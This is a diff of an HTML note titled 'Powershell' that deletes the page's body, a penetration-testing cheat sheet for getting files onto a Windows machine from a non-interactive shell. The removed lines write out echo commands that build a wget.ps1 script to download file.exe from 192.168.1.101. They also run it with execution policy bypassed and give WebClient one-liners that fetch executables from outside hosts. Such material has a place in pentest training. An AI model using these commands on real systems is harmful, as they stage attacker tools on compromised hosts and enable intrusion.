@@ -3,21 +3,4 @@
 <head>
 <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
 <title>Powershell</title>
-</head><body>Remember since we only have a non-interactive shell we cannot start PowerShell.exe, because our shell can't handle that. But we can get around that by creaing a PowerShell-script and then executing the script:<br/>
-<br/>
-echo $storageDir = $pwd &gt; wget.ps1<br/>
-echo $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1<br/>
-echo $url = "http://192.168.1.101/file.exe" &gt;&gt;wget.ps1<br/>
-echo $file = "output-file.exe" &gt;&gt;wget.ps1<br/>
-echo $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1<br/>
-<br/>
-Now we invoke it with this crazy syntax:<br/>
-powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1<br/>
-<br/>
-<br/>
-<br/>
-Alternative System.Net.WebClient one-liner<br/>
-(New-Object System.Net.WebClient).DownloadFile("https://myserver/filename", "C:\Windows\Temp\filename") <br/>
-<br/>
-<br/>
-powershell -nop -c "(New-Object System.Net.WebClient).DownloadFile('http://web/file.exe','C:\users\you\file.exe')"</body></html>
+</head><body></body></html>
